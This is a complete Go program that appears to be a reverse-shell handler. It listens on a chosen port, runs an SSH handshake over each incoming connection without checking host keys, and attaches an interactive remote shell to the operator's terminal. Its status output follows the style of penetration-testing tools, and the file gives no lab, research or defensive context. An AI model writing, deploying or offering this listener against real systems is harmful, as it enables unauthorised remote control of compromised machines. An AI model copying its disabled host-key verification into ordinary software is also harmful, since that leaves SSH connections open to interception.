package main

import (
	"fmt"
	"net"
	"os"

	"golang.org/x/crypto/ssh"
)

func main() {
	// setup
	port := os.Args[1]
	sshConfig := &ssh.ClientConfig{
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}

	socket, err := net.Listen("tcp", "0.0.0.0:"+port)
	if err != nil {
		panic(err)
	}
	for {
		fmt.Println("[+] Listening on 0.0.0.0:" + port)
		conn, err := socket.Accept()
		if err != nil {
			fmt.Println("[!] Accept error:", err)
			continue
		}
		fmt.Println("[+] Accepted connection from ", conn.RemoteAddr())

		_client_initial_conn, channels, requests, err := ssh.NewClientConn(conn, conn.RemoteAddr().String(), sshConfig)
		if err != nil {
			fmt.Println("[!] Handshake failed:", err)
			conn.Close()
			continue
		}
		fmt.Println("[+] Received connection from ", conn.RemoteAddr())

		client := ssh.NewClient(_client_initial_conn, channels, requests)
		session, err := client.NewSession()
		if err != nil {
			fmt.Printf("[!] Session error: %s\nError: %s\n", client.RemoteAddr(), err)
			conn.Close()
			continue
		}

		handleSession(session)
		conn.Close()
	}
}

func handleSession(session *ssh.Session) {
	defer session.Close()
	session.Stdout = os.Stdout
	session.Stderr = os.Stderr
	session.Stdin = os.Stdin
	err := session.Shell()
	if err != nil {
		fmt.Println("[!] Shell error:", err)
		return
	}
	session.Wait()
}
